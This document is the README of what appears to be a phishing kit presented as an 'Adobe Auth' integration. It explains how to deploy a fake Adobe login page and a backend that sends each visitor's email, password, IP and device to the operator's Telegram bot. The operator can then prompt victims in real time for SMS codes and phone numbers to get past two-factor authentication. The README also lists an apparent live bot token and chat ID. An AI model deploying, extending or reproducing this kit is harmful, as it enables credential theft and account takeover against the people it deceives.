# 🎨 Adobe Auth — Telegram Bot Integration

Complete authentication system: Adobe-styled frontend + Telegram bot admin panel.

---

## 📁 Project Structure

```
adobe-project/
├── frontend/
│   └── index.html          ← The website (deploy to Netlify)
└── backend/
    ├── server.js            ← Node.js server (deploy to Railway/Render)
    ├── package.json
    ├── .env.example
    ├── railway.toml
    └── render.yaml
```

---

## 🚀 STEP-BY-STEP DEPLOYMENT

### STEP 1 — Deploy Backend to Railway (FREE/$5/mo)

1. Go to **https://railway.app** and sign up (free)
2. Click **"New Project"** → **"Deploy from GitHub"**
   - Or use **"Deploy from template"** → choose Node.js
3. Upload only the `backend/` folder contents
4. Set these **Environment Variables** in Railway dashboard:
   ```
   BOT_TOKEN  = 8748301916:AAHC09wVDPVG-xLObOvD-k_pAFiu8TnkwAw
   ADMIN_CHAT = 8745609962
   PORT       = 3000
   ```
5. Railway will give you a URL like: `https://adobe-auth-backend.up.railway.app`
6. **Copy that URL** — you'll need it in Step 2.

> Alternative: Use **Render.com** — upload the `render.yaml` file and deploy.

---

### STEP 2 — Update the Frontend with Your Backend URL

Open `frontend/index.html` and find this line (around line 180):

```javascript
const BACKEND_URL = window.location.hostname === 'localhost' ...
```

Change it to:
```javascript
const BACKEND_URL = 'https://YOUR-RAILWAY-URL.up.railway.app';
```

Replace `YOUR-RAILWAY-URL` with the actual URL from Step 1.

---

### STEP 3 — Deploy Frontend to Netlify (FREE)

1. Go to **https://netlify.com** and sign up
2. Click **"Add new site"** → **"Deploy manually"**
3. Drag and drop the `frontend/` folder onto the page
4. Done! Netlify gives you a URL like: `https://your-site.netlify.app`

---

## 🤖 HOW THE TELEGRAM BOT WORKS

When someone enters their email & password on the website:

1. **You receive a Telegram message** like this:
   ```
   🔐 NEW VISIT 🔐
   📧 Email: user@example.com
   🔑 Password: abc123
   🌐 IP: 102.89.xx.xx
   📱 Device: Chrome on Windows
   ```

2. **You see 6 buttons:**
   - ✅ **Yes Prompt** → Access granted, visitor sees "Welcome" screen
   - 📱 **SMS Code I** → Asks visitor to enter a 6-digit code
   - 📟 **SMS Code II** → Asks for a second code
   - 📞 **Number Prompt** → Asks visitor for their phone number
   - ❌ **Password Error** → Tells visitor their password is wrong
   - 🚫 **Block Visitor** → Shows "Account Blocked" page

3. When visitor submits an SMS code or phone number, **you get another message** with the data and new action buttons.

---

## 🧪 TESTING LOCALLY

```bash
# 1. Install dependencies
cd backend
npm install

# 2. Start server
node server.js

# 3. Open frontend in browser
# Just open frontend/index.html in your browser
# (it auto-detects localhost and connects to port 3000)
```

---

## ⚡ QUICK DEPLOY (Alternative — No Backend Needed for Testing)

If you just want to test the frontend design, open `frontend/index.html` directly in a browser.
The bot integration requires the backend to be running.

---

## 🔒 Security Notes

- Keep your `BOT_TOKEN` private — never share it publicly
- The admin `ADMIN_CHAT` ID ensures only YOU receive notifications
- Sessions auto-expire after 10 minutes

---

## 📞 Support

Your bot: **@Madtt7bot**  
Your chat ID: **8745609962**
